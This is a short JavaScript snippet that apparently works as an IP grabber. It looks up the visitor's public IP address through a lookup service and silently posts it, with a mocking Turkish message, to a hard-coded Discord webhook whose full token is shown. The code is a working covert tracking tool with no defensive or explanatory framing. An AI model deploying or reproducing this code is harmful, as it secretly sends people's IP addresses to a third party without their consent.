var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();
})
.then (function(data) {
ip = data.ip;
var webhook = 'https://canary.discord.com/api/webhooks/1125111722726916167/Y756rKUo2urp1eVcQRb7H1qYR_QZJAIWL-5gc1o9aWh7nuwT7JeuJ5h5IVSvJlxMuVOQ'
var message = {
    content: 'salagin ipsi:' + ip
};

fetch(webhook, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
body: JSON.stringify(message)
})
})